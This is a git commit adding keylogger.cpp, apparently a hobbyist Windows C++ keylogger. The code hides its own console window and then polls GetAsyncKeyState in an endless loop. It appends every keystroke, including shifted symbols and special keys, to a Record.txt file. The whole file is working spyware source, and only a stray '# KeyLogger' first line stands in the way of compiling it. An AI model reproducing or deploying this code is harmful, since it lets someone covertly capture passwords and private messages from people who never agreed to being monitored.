753710eefa911c7705467c728049ec582511abdb
viditkulshreshtha <33063443+viditkulshreshtha@users.noreply.github.com>
2018-03-24 02:03:59 +0530

    keylogger.cpp

---
+++ keylogger.cpp
@@ -0,0 +1,154 @@
+# KeyLogger
+#include <iostream>
+#include <windows.h>
+#include <Winuser.h>
+#include <fstream>
+
+using namespace  std;
+
+void log();
+void hide();
+int main(){
+	hide();
+	log();
+	return 0;
+	
+}
+void log(){
+	char key;
+	for(;;)	{
+
+		//Sleep(0);  //It will pause the program to sleep for that amount of milliseconds. 0 will say that whenever any app starts it'll relinquish
+		for(key=8;key<=222;key++){
+			if(GetAsyncKeyState(key) == -32767)  //GetAsyncKeyState(key) this triggers when any key is pressed on keyboard.
+      {
+				ofstream write("Record.txt", ios::app); //added ios::app because we don't want to create a new file everytime a user presses a key.
+			if(( key > 64 ) && ( key < 91 ) && !(GetAsyncKeyState(0x10)) ){
+				key+=32;
+				write << key;
+				write.close();
+				break;
+			}
+			else if((key>64) && (key<91)){
+				write << key;
+				write.close();
+				break;
+			}
+			else{
+				switch(key){
+					case 48:
+						{
+							if( GetAsyncKeyState(0x10) )  
+								write << ")";
+							else 
+								write << "0";	
+						}
+						break;
+					case 49:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "!";
+							else 
+								write << "1";
+						}
+						break;
+					case 50:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "@";
+							else 
+								write << "2";	
+						}
+						break;
+					case 51:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "#";
+							else 
+								write << "3";	
+						}
+						break;
+					case 52:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "$";
+							else 
+								write << "4";	
+						}
+						break;
+					case 53:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "%";
+							else 
+								write << "5";	
+						}
+						break;
+					case 54:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "^";
+							else 
+								write << "6";	
+						}
+						break;
+					case 55:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "&";
+							else 
+								write << "7";	
+						}
+						break;
+					case 56:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "*";
+							else 
+								write << "8";	
+						}
+						break;
+					case 57:
+						{
+							if( GetAsyncKeyState(0x10) )
+								write << "(";
+							else 
+								write << "9";	
+						}
+						break;
+
+					case VK_SPACE:
+					 	write << " ";
+					break;
+
+					case VK_RETURN:
+						write << "\n";
+					break;
+
+					case VK_TAB:
+						write << "	";
+					break;
+
+					case VK_BACK:
+						write <<"<Backspace>";
+					break;
+
+					case VK_ESCAPE:
+						write << "<ESC>";
+					break;
+
+					case VK_DELETE:
+						write << "<Delete>";
+					break;
+				}
+			}
+			}
+		}
+	}
+}
+void hide (){
+	HWND stealth;
+	AllocConsole();
+	stealth=FindWindowA("ConsoleWindowClass",NULL);
+	ShowWindow(stealth,0);
+}
